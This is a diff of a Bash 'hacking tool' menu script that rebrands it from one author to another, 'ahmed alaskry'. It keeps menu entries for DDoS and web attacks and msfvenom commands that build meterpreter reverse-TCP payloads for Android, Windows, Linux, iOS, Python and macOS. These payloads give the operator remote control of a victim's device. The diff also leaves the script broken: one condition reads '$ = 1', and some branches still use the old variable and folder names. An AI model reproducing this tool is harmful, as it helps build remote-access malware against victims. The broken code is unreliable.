@@ -12,15 +12,15 @@ rasma(){
 	clear
 	echo -e $red """
 
-			█     ___  _           __  _   _____   _        ___   __    __       _  
-    /   | | |         /   | /  ___/ | | / /  |  _  \  \ \  / /      |_   _| /  _  \ /  _  \ | |     
-   / /| | | |        / /| | | |___  | |/ /   | |_| |   \ \/ /         | |   | | | | | | | | | |     
-  / / | | | |       / / | | \___  \ | |\ \   |  _  /    \  /          | |   | | | | | | | | | |     
- / /  | | | |___   / /  | |  ___| | | | \ \  | | \ \    / /           | |   | |_| | | |_| | | |___  
-/_/   |_| |_____| /_/   |_| /_____/ |_|  \_\ |_|  \_\  /_/            |_|   \_____/ \_____/ |_____| 
+		    ___  _           __  _   ________
+    /   | | |         /   | /  ___/ | | / /  |  _  \  \ \  / 
+   / /| | | |        / /| | | |___  | |/ /   | |_| |   \ \/ /
+  / / | | | |       / / | | \___  \ | |\ \   |  _  /    \  /   
+ / /  | | | |___   / /  | |  ___| | | | \ \  | | \ \    / / 
+/_/   |_| |_____| /_/   |_| /_____/ |_|  \_\ |_|  \_\  /_/ 
 				$yellow Welcome to alaskry TOOL $green($blue$my_ip$green)
-				$yellow By :$red ahmed$green /¯\ |  /¯\ |¯  |/  |¯| \| 
-                                                             |¯| |_ |¯|  ¯| |¯\ |¯\  |
+				$yellow By :$red ahmed$green alaskry E.G
+                                                             
 	"""
 
 }
@@ -47,30 +47,30 @@ main(){
 	echo -e " $green[$yellow X $green]$blue Exit\n"
 	sleep 0.2
 	echo -e $white 
-	read -p "[ H_A_K_5 ]~# " MOHAMED
-	if [ $MOHAMED = 1 ];then
+	read -p "[ Ahmed ALASKRY==> ] " ALASKRY
+	if [ $ = 1 ];then
 		Fix_KaiL
-	elif [ $MOHAMED = 2 ];then
+	elif [ $ALASKRY = 2 ];then
 		PayLoaD
-	elif [ $MOHAMED = 3 ]; then
+	elif [ $ALASKRY = 3 ]; then
 		cd .model
 		bash .hashing.sh
-	elif [ $MOHAMED = 4 ]; then
+	elif [ $ALASKRY = 4 ]; then
 		cd .model
 		bash .msf.sh
-	elif [ $MOHAMED = 5 ]; then
+	elif [ $ALASKRY = 5 ]; then
 		kailHunter
-	elif [ $MOHAMED = 6 ]; then
+	elif [ $ALASKRY = 6 ]; then
 		web
-	elif [ $MOHAMED = 7 ];then
+	elif [ $ALASKRY = 7 ];then
 		TOoLs
 	elif [ $MOHAMED = 8 ]; then
 		ddos
 	elif [ $MOHAMED = 9 ]; then
 		serve
-	elif [ "$MOHAMED" = "X" ] || [ "$MOHAMED" = "x" ]; then
+	elif [ "$ALASKRY" = "X" ] || [ "$ALASKRY" = "x" ]; then
 		exit 
-	elif [ "$MOHAMED" = "ip" ] || [ "$MOHAMED" = "IP" ]; then
+	elif [ "$ALASKRY" = "ip" ] || [ "$ALASKRY" = "IP" ]; then
 		ip 
 	else :
 		rasma
@@ -93,7 +93,7 @@ Fix_KaiL(){
 	echo -e " $green[$yellow 6 $green]$blue update sources.list + copyFIle $green($yellow VMware $green)" ;sleep 0.2
 	echo -e " $green[$yellow 0 $green]$blue Back" ;sleep 0.2
 	echo -e $white
-	read -p "[ H_A_K_5 / Fix_KaiL ]~# " fixed
+	read -p "[ ALASKRY .EG / Fix_KaiL ]~# " fixed
 
 	if [ $fixed = 1 ];then
 		echo -e "$green [*]$yellow fix sound problm start ..."
@@ -173,7 +173,7 @@ PayLoaD(){
 	echo -e "$green [$red 2 $green]$cyan TERMUX\n"
 	echo -e "$green [$red 0 $green]$cyan Back \n"
 	echo -e $white
-	read -p "[ H_A_K_5 / PayLoaD ]~# " payload
+	read -p "[ ALASKRY .EG / PayLoaD ]~# " payload
 	if [ $payload = 1 ] ; then 
 		clear 
 		echo -e $red
@@ -192,7 +192,7 @@ PayLoaD(){
 		echo
 		echo -e $red"[0]"$green" Back\n" ;sleep 0.2
 		echo -e $white
-		read -p "[ H_A_K_5 / PayLoaD / ROoT ]~# " root
+		read -p "[ ALASKRY .EG / PayLoaD / ROoT ]~# " root
 		if [ $root = 1 ] ; then 
 			clear
 			echo -e  "$yellow Payload $red Android\n"
@@ -202,9 +202,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk
-			mv $name.apk HAK5_PaYLOad
+			mv $name.apk ALASKRY_PaYLOad
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
+			echo -e "$yellow The PaylOAD in $red ALASKRY_PaYLOad"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -218,9 +218,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o $name.exe
-			mv $name.exe HAK5_PaYLOad
+			mv $name.exe ALASKRY_PaYLOad
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
+			echo -e "$yellow The PaylOAD in $red ALASKRY_PaYLOad"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -234,7 +234,7 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
-			mv $name.elf HAK5_PaYLOad
+			mv $name.elf ALASKRY_PaYLOad
 			clear
 			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
 			sleep 5
@@ -250,9 +250,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o $name.api
-			mv $name.api HAK5_PaYLOad
+			mv $name.api ALASKRY_PaYLOad
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
+			echo -e "$yellow The PaylOAD in $red ALASKRY_PaYLOad"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -268,7 +268,7 @@ PayLoaD(){
 			msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.py
 			mv $name.py HAK5_PaYLOad
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
+			echo -e "$yellow The PaylOAD in $red ALASKRY_PaYLOad"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -284,7 +284,7 @@ PayLoaD(){
 			msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o $name.macho
 			mv $name.macho HAK5_PaYLOad
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
+			echo -e "$yellow The PaylOAD in $red ALASKRY_PaYLOad"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -292,12 +292,12 @@ PayLoaD(){
 		elif [ $root = 0 ] ; then
 			clear
 			echo -e $green
-			figlet "		MOHAMED"
+			figlet "        ahmedalaskry.EG"
 			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 			sleep 0.1
-			echo -e "$yellow By : $green MOHAMED $cyan HACKER"
+			echo -e "$yellow By : $green ahmed $cyan alaskry"
 			sleep 0.1
-			echo -e "$yellow Telegram $red @HcmohtatefOfficial"
+			echo -e "$yellow Telegram $red @a7med_alaskry"
 			sleep 0.1
 			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 			sleep 3
@@ -324,7 +324,7 @@ PayLoaD(){
 		echo
 		echo -e $red"[0]"$green" Back\n" ;sleep 0.2
 		echo -e $white
-		read -p "[ H_A_K_5 / PayLoaD / termux ]~# " termux
+		read -p "[ ALASKRY / PayLoaD / termux ]~# " termux
 		if [ $termux = 1 ] ; then 
 			clear
 			echo -e  "$yellow Payload $red Android\n"
@@ -334,9 +334,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk
-			mv $name.apk /sdcard/HAK5
+			mv $name.apk /sdcard/ALASKRY
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5"
+			echo -e "$yellow The PaylOAD in $red ALASKRY"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -350,9 +350,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o $name.exe
-			mv $name.exe /sdcard/HAK5
+			mv $name.exe /sdcard/ALASKRY
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5"
+			echo -e "$yellow The PaylOAD in $red ALASKRY"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -367,7 +367,7 @@ PayLoaD(){
 			sleep 2
 			msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
 			mv $name.elf /sdcard/HAK5 ;clear
-			echo -e "$yellow The PaylOAD in $red HAK5"
+			echo -e "$yellow The PaylOAD in $red ALASKRY"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -381,9 +381,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o $name.api
-			mv $name.api /sdcard/HAK5
+			mv $name.api /sdcard/ALASKRY
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5"
+			echo -e "$yellow The PaylOAD in $red ALASKRY"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -397,9 +397,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.py
-			mv $name.py /sdcard/HAK5
+			mv $name.py /sdcard/ALASKRY
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5"
+			echo -e "$yellow The PaylOAD in $red ALASKRY"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -413,9 +413,9 @@ PayLoaD(){
 			echo -e "$green [~] $yellow Make PayLOaD..."
 			sleep 2
 			msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o $name.macho
-			mv $name.macho /sdcard/HAK5
+			mv $name.macho /sdcard/ALASKRY
 			clear
-			echo -e "$yellow The PaylOAD in $red HAK5"
+			echo -e "$yellow The PaylOAD in $red ALASKRY"
 			sleep 5
 			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
 			sleep 5
@@ -423,12 +423,12 @@ PayLoaD(){
 		elif [ $termux = 0 ] ; then
 			clear
 			echo -e $green
-			figlet "		MOHAMED"
+			figlet "        ALASKRY"
 			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 			sleep 0.1
-			echo -e "$yellow By : $green MOHAMED $cyan HACKER"
+			echo -e "$yellow By : $green ALASKRY $cyan ALASKRY"
 			sleep 0.1
-			echo -e "$yellow Telegram $red @HcmohtatefOfficial"
+			echo -e "$yellow Telegram $red @a7med_alaskry"
 			sleep 0.1
 			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 			sleep 3
@@ -440,12 +440,12 @@ PayLoaD(){
 	elif [ $payload = 0  ]; then
 		clear
 		echo -e $green
-		figlet "          MOHAMED"
+		figlet "          ALASKRY"
 		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 		sleep 0.1
-		echo -e "$yellow By : $green MOHAMED $cyan HACKER"
+		echo -e "$yellow By : $green ALASKRY $cyan ALASKRY"
 		sleep 0.1
-		echo -e "$yellow Telegram $red @HcmohtatefOfficial"
+		echo -e "$yellow Telegram $red @a7med_alaskry"
 		sleep 0.1
 		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
 		sleep 3
